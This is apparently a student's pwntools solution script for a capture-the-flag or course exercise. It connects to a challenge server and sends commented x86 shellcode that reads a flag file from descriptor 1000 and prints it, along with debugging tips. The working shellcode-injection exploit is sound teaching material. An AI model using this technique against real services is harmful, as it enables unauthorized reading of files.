#!/usr/bin/env python3
from pwn import *

# Notes:
# - ltrace ./a.out prints all of the library functions used in a binary, whilst strace prints this in greater detail.
# - to connect your script to gdb, we can use the pid printed to terminal when running the script (16238 for example)
# and then in a gdb terminal, run command 'attach 16238'.
# - we can also conenct pwntools directly to gdb using attach and debug commands (https://docs.pwntools.com/en/stable/gdb.html)
# - we can use pause() in pwntools to pause the execution of our pwntools script at any point
# - to create shellcode, we use the pwntools command asm().
# - http://cgi.cse.unsw.edu.au/~z5164500/syscall/ is a useful x86 syscall reference table
# - to determine the length of our shellcode, use command log.info(len(shellcode)), and then you can later pad it out if necessary
# - if you are trying to determine the offset of the return address from your buffer and getting segmentation fault
# for an input of length 1, then this isn't because you are overwriting the return address but is because it is trying to execute this input (and it can't execute a string like 'aaaa')

# Before creating the script:

# When running the binary, it states that it is basically the same as the lab exercise,
# except I can only call the syscalls read and write. This means that the program simply
# asks for shellcode as input, and then will execute it.

# It then says a file containing the flag is opened with fd 1000. Hence, I am going to
# want to run shellcode which reads from fd 1000, and the prints the result to stdout.

# The script:

p = remote("plsdonthaq.me", 3001)

# This shellcode is split into a call to sys_read and a call to sys_write.

# For sys_read, we first subtract 500 from the value stored in the stack pointer,
# which creates a buffer of 500 bytes to write into at the top of the stack.

# Then, we want to move the arguments for this function into the appropriate registers.
# Using the syscall reference table, we move the fd 1000 into ebx, the address of
# the buffer into ecx, and the number of bytes to read into edx. Finally, we move
# the value for sys_read into eax and call it using int 0x80.

# For sys_write, we simply need to move the arguments into the registers. Hence, we
# move the fd 1 (for stdout) into ebx, the address of the buffer into ecx, and the
# number of bytes to read into edx. We load this value from eax because sys_read
# returns the number of bytes read into eax, so we only want to write that many bytes.
# Finally we move the value for sys_write into eax and call it using int 0x80.
shellcode = asm("""
sub esp, 500
mov ebx, 1000
lea ecx, [esp]
mov edx, 500
mov eax, 0x03
int 0x80

mov ebx, 1
lea ecx, [esp]
mov edx, eax
mov eax, 0x04
int 0x80
""")

p.sendline(shellcode)

p.interactive()